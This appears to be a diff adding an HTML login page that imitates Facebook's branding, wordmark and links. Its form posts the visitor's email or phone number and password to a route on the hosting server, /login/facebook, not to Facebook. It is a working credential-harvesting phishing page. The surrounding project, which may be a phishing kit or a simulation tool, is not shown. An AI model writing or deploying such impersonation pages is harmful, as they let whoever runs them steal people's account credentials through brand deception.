@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Log In or Sign Up</title>
+    <link rel="stylesheet" href="/static/css/style.css">
+    <style>
+        .fb-header {
+            color: #1877f2;
+            font-size: 48px;
+            font-weight: 700;
+            letter-spacing: -1px;
+            margin-bottom: 4px;
+        }
+        .fb-tagline {
+            font-size: 14px;
+            color: #1c1e21;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <div class="logo">
+                <div class="fb-header">facebook</div>
+                <p class="fb-tagline">Log in to Facebook</p>
+            </div>
+            <form action="/login/facebook" method="POST">
+                <div class="form-group">
+                    <input type="text" name="email" placeholder="Email address or phone number" required autofocus>
+                </div>
+                <div class="form-group">
+                    <input type="password" name="password" placeholder="Password" required>
+                </div>
+                <button type="submit" class="btn-primary">Log In</button>
+            </form>
+            <div class="links">
+                <a href="#">Forgotten account?</a>
+            </div>
+            <div class="divider"></div>
+            <div class="footer-text">
+                <a href="#">Create new account</a>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
